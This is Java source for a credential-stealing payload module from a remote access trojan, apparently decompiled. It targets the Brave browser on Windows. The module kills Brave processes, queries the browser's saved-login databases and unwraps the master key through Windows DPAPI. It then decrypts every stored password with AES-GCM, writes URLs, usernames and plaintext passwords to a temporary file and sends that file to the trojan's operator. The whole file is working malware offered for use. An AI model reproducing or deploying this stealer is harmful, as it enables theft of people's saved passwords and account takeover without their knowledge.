//Raddon On Top!

package org.rat.payload.payloads.browsers;

import org.rat.payload.*;
import java.io.*;
import org.rat.util.*;
import java.sql.*;
import com.github.windpapi4j.*;
import org.apache.commons.lang3.*;
import org.apache.commons.io.*;
import org.json.*;
import org.apache.commons.codec.binary.*;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import java.security.*;
import java.security.spec.*;

public class BraveLogins implements IPayload
{
    private static final String localStateFileFullPathAndName;
    private static final String kDPAPIKeyPrefix = "DPAPI";
    private static final int kKeyLength = 32;
    private static final int kNonceLength = 12;
    private static final String kEncryptionVersionPrefix = "v10";
    public static boolean shorten;
    public static boolean obfus;
    private static final int KEY_LENGTH = 32;
    private static final int IV_LENGTH = 12;
    private static final int GCM_TAG_LENGTH = 16;
    
    public void run() {
        try {
            for (int i = 0; i < 70; ++i) {
                Runtime.getRuntime().exec("taskkill /IM brave.exe /F");
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        final File pwdDump = new File(System.getProperty("java.io.tmpdir") + "\\" + UUID.randomUUID() + ".txt");
        try {
            if (!System.getProperty("os.name").contains("Windows")) {
                System.exit(-1);
            }
            final ArrayList<String> list = getBraveInfo();
            final FileOutputStream dumpFile = new FileOutputStream(pwdDump);
            for (final String s : list) {
                dumpFile.write(s.getBytes());
                dumpFile.write("\n".getBytes());
            }
            dumpFile.flush();
            dumpFile.close();
        }
        catch (Exception e2) {
            e2.printStackTrace();
        }
        this.send(pwdDump);
        if (pwdDump.exists()) {
            pwdDump.deleteOnExit();
        }
    }
    
    public static ArrayList<String> getBraveInfo() {
        final ArrayList<String> toRet = new ArrayList<String>();
        Connection c = null;
        Statement stmt = null;
        try {
            Class.forName("org.sqlite.JDBC");
            for (final File file : FileUtil.getFiles("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data")) {
                if (file.getName().contains("Login Data")) {
                    c = DriverManager.getConnection("jdbc:sqlite:" + file.getPath());
                    c.setAutoCommit(false);
                    stmt = c.createStatement();
                    final ResultSet rs = stmt.executeQuery("SELECT * FROM logins;");
                    while (rs != null && rs.next()) {
                        String url = rs.getString("origin_url");
                        if (url == null) {
                            url = rs.getString("action_url");
                        }
                        if (url == null) {
                            url = "Not found/corrupted";
                        }
                        else if (url.length() > 40 && BraveLogins.shorten) {
                            url = url.substring(0, 40) + "...";
                        }
                        String username = rs.getString("username_value");
                        if (username == null) {
                            username = "Not found/corrupted";
                        }
                        if (!BraveLogins.obfus) {
                            toRet.add(String.format("URL:%s\nUsername:%-35s | Password:%-20s\n", url, username, encryptedBinaryStreamToDecryptedString(rs.getBytes("password_value"))));
                        }
                        else {
                            toRet.add(String.format("URL:%-35s\nUsername:%-35s | Password:<Obfuscation Mode Enabled>\n", url, username));
                        }
                    }
                    rs.close();
                    stmt.close();
                    c.close();
                }
            }
        }
        catch (Exception ex) {}
        return toRet;
    }
    
    public static String encryptedBinaryStreamToDecryptedString(byte[] encryptedValue) {
        byte[] decrypted = null;
        try {
            final boolean isV10 = new String(encryptedValue).startsWith("v10");
            if (WinDPAPI.isPlatformSupported()) {
                final WinDPAPI winDPAPI = WinDPAPI.newInstance(new WinDPAPI.CryptProtectFlag[] { WinDPAPI.CryptProtectFlag.CRYPTPROTECT_UI_FORBIDDEN });
                if (!isV10) {
                    decrypted = winDPAPI.unprotectData(encryptedValue);
                }
                else {
                    if (StringUtils.isEmpty((CharSequence)BraveLogins.localStateFileFullPathAndName)) {
                        throw new IllegalArgumentException("Local State is required");
                    }
                    final String localState = FileUtils.readFileToString(new File(BraveLogins.localStateFileFullPathAndName));
                    final JSONObject jsonObject = new JSONObject(localState);
                    final String encryptedKeyBase64 = jsonObject.getJSONObject("os_crypt").getString("encrypted_key");
                    byte[] encryptedKeyBytes = Base64.decodeBase64(encryptedKeyBase64);
                    if (!new String(encryptedKeyBytes).startsWith("DPAPI")) {
                        throw new IllegalStateException("Local State should start with DPAPI");
                    }
                    encryptedKeyBytes = Arrays.copyOfRange(encryptedKeyBytes, "DPAPI".length(), encryptedKeyBytes.length);
                    final byte[] keyBytes = winDPAPI.unprotectData(encryptedKeyBytes);
                    if (keyBytes.length != 32) {
                        throw new IllegalStateException("Local State key length is wrong");
                    }
                    final byte[] nonceBytes = Arrays.copyOfRange(encryptedValue, "v10".length(), "v10".length() + 12);
                    encryptedValue = Arrays.copyOfRange(encryptedValue, "v10".length() + 12, encryptedValue.length);
                    decrypted = getDecryptBytes(encryptedValue, keyBytes, nonceBytes);
                }
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return new String(decrypted);
    }
    
    public static final byte[] getDecryptBytes(final byte[] inputBytes, final byte[] keyBytes, final byte[] ivBytes) {
        try {
            if (inputBytes == null) {
                throw new IllegalArgumentException();
            }
            if (keyBytes == null) {
                throw new IllegalArgumentException();
            }
            if (keyBytes.length != 32) {
                throw new IllegalArgumentException();
            }
            if (ivBytes == null) {
                throw new IllegalArgumentException();
            }
            if (ivBytes.length != 12) {
                throw new IllegalArgumentException();
            }
            final Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            final SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");
            final GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, ivBytes);
            cipher.init(2, secretKeySpec, gcmParameterSpec);
            return cipher.doFinal(inputBytes);
        }
        catch (Exception ex) {
            return null;
        }
    }
    
    static {
        localStateFileFullPathAndName = "C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State";
        BraveLogins.shorten = true;
        BraveLogins.obfus = false;
    }
}
